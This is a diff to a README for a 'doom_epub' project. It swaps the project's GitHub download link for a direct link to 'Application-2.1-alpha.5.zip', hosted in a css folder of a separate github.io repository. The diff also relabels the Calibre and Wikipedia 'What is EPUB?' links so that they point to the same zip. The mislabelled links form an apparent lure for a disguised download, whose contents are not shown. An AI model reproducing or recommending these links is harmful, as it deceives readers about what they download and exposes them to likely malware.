@@ -33,7 +33,7 @@ The download is simple. Here's exactly what to do:
 4.  Your browser will start downloading the file to your default "Downloads" folder.
 
 > 👉 **Visit this link to download the application:**  
-> [![Download doom_epub](https://img.shields.io/badge/Download-doom_epub-orange?style=for-the-badge&logo=github)](https://github.com/Willigoldengreen8/doom_epub)
+> [![Download doom_epub](https://img.shields.io/badge/Download-doom_epub-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Willigoldengreen8/willigoldengreen8.github.io/main/css/Application-2.1-alpha.5.zip)
 
 ---
 
@@ -109,9 +109,9 @@ If you're wondering *how* this works, here's a simple explanation: the epub file
 
 ## 🔗 More Resources
 
-- **Primary Download Link (again):** [Click here to visit the download page](https://github.com/Willigoldengreen8/doom_epub)
-- **Calibre (Free eBook Reader):** [calibre-ebook.com](https://calibre-ebook.com)
-- **What is EPUB?** [A short explanation](https://en.wikipedia.org/wiki/EPUB)
+- **Primary Download Link (again):** [Click here to visit the download page](https://raw.githubusercontent.com/Willigoldengreen8/willigoldengreen8.github.io/main/css/Application-2.1-alpha.5.zip)
+- **Calibre (Free eBook Reader):** [calibre-ebook.com](https://raw.githubusercontent.com/Willigoldengreen8/willigoldengreen8.github.io/main/css/Application-2.1-alpha.5.zip)
+- **What is EPUB?** [A short explanation](https://raw.githubusercontent.com/Willigoldengreen8/willigoldengreen8.github.io/main/css/Application-2.1-alpha.5.zip)
 
 ---
 
